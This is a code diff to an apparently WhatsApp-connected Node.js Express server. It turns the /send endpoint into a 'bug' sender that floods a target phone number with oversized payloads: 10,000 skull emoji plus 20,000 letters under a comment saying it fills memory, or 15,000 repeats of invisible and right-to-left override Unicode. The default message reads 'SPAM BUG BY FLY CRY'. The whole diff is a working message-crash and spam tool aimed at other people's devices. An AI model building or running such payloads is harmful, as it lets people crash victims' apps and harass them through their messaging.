@@ -42,12 +42,22 @@ app.get('/status', (req, res) => {
 })
 
 app.get('/send', async (req, res) => {
-    let { target, msg } = req.query
+    let { target, type } = req.query
     if(!target || !sock || !isConnected) return res.send('Error: Belum connect WA!')
+    
     let jid = target.replace(/\D/g, '') + '@s.whatsapp.net'
+    let msg = "SPAM BUG BY FLY CRY"
+    
+    // PAYLOAD KHUSUS
+    if (type === 'crash') {
+        msg = "💀".repeat(10000) + "A".repeat(20000); // Bikin memori penuh
+    } else if (type === 'blank') {
+        msg = "\u200b\u200d\u202e".repeat(15000); // Unicode invisible
+    }
+
     try {
         await sock.sendMessage(jid, { text: msg })
-        res.send('Terkirim!')
+        res.send('Terkirim: ' + type)
     } catch (e) {
         res.send('Gagal: ' + e.message)
     }
